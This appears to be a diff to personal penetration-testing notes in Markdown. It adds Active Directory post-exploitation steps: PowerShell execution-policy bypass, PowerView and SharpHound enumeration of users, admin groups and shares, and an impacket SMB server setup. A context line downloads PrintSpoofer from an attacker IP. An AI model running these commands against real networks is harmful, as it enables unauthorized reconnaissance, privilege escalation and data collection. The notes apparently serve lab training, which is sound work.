@@ -1633,3 +1633,117 @@ iwr http://10.8.36.31:8002/PrintSpoofer64.exe -Outfile C:\Users\Bob\Desktop\Prin
 ![image](https://github.com/user-attachments/assets/eeeb1cc2-71ed-420e-9386-9007deaf600b)
 
 ------------------
+
+### Post Exploitation
+
+------------------- 
+
+- Bypass powershell execution policy with-:
+
+```powershell
+powershell -ep bypass
+```
+- Start powerview with
+
+```powershell
+Import-Module .\PowerView.ps1
+```
+
+- Enumerate the domain user with-:
+
+```powershell
+Get-NetUser | select cn
+```
+
+![image](https://github.com/user-attachments/assets/59a719fa-b85f-47c0-80c5-2b9c9e18d4c0)
+
+- Enumerate Domain groups
+
+```powershell
+Get-NetGroup -GroupName *admin*
+```
+
+![image](https://github.com/user-attachments/assets/2c352812-a69f-40d4-a196-66a482331f96)
+
+- Enumerating more, use [cheatsheet]( https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993) and [here](https://www.hackingarticles.in/active-directory-enumeration-powerview/)
+
+- Enumerating shares in AD-:
+
+```
+Invoke-ShareFinder
+```
+
+![image](https://github.com/user-attachments/assets/8efc7b0a-13b5-4dfe-acfe-0c4fc641a6c1)
+
+- Enumerating the windows os on AD-:
+
+```
+Get-NetComputer -fulldata | select operatingsystem
+```
+
+---------------------
+
+### Bloodhound
+
+---------------------
+
+- Bloodhound is a graphical interface that allows you to visually map out the network. This tool along with SharpHound which similar to PowerView takes the user, groups, trusts etc. of the network and collects them into .json files to be used inside of Bloodhound.
+- Installing bloodhound-:
+
+```bash
+apt-get install bloodhound
+neo4j console #- default credentials -> neo4j:neo4j
+```
+- Starting bloodhound
+
+```
+powershell -ep bypass
+Import-Module .\SharpHound.ps1    
+Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
+```
+![Uploading image.png…]()
+
+
+------------------
+
+### SMB1 ERROR while receiving files
+
+------------------
+
+- Error-:
+
+![image](https://github.com/user-attachments/assets/5df19ea4-5a0f-46fe-bcf5-851797a90fec)
+
+- Ensure smb2support is specified
+
+```
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali . -smb2support
+```
+
+![image](https://github.com/user-attachments/assets/f3dfc4e8-af42-4883-8522-b5796938193e)
+
+----------------------
+
+### Error-:  You can't access this shared folder because your organization's security policies block unauthenticated guest access.These policies help protect your PC from unsafe or malicious devices on the network
+
+---------------------
+
+- Error-:
+
+![image](https://github.com/user-attachments/assets/282a9336-1e54-42e8-ae2e-00ee8a173369)
+
+
+- [Fix](https://vtechnologies.my.site.com/support/s/article/You-can-t-access-this-shared-folder-because-your-organization-s-security-policies-block-unauthenticated-guest-access)-:
+
+![image](https://github.com/user-attachments/assets/6b9e1c0a-8b0a-4180-ae82-c850bfd79ee2)
+
+- SOlved-:
+
+![image](https://github.com/user-attachments/assets/42516a6b-25f3-46d2-a5ea-93e7edf4bc00)
+
+-----------------------
+
+
+
+
+
